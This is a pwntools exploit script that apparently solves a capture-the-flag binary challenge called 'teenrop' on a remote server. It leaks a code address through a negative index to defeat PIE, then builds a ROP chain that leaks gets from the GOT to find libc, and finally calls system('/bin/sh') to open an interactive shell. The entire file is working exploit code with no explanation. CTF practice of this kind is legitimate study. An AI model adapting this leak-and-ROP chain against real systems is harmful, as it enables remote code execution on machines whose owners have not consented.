from pwn import *

# PIE enabled --> base addresses randomized

SERVER = "challs1.nusgreyhats.org"
PORT = 5014

# p = process('./teenrop')
p = remote(SERVER, PORT)

elf = ELF('./teenrop')
libc = ELF('./libc.so.6')

context.binary = elf

MAIN_OFFSET = elf.sym.main

p.recvuntil(': ')
p.sendline(b'2')
p.clean()
p.sendline(b'-1')
p.recvuntil('Value: ')
main147_leak = int(p.recvuntil('\n').strip())
log.info(f"main+147 leak: {hex(main147_leak)}")

elf_base = main147_leak - 147 - MAIN_OFFSET
elf.address = elf_base

rop = ROP(elf)
rop.puts(elf.got.gets)
rop.main()

p.sendline(b'1')
p.sendline(b'1')
p.clean()
p.sendline(flat({ 40: rop.chain() }))
gets_leak = unpack(p.recvline().strip(), 'all')
log.info(f"gets leak: {hex(gets_leak)}")

# set as libc base
libc.address = gets_leak - libc.sym.gets

binsh = next(libc.search(b'/bin/sh'))

# call system(bin/sh)
rop = ROP([libc, elf])
rop.call(rop.ret)
rop.system(binsh)

p.sendline(b'2')
p.clean()
p.sendline(flat({ 40: rop.chain() }))

p.interactive()
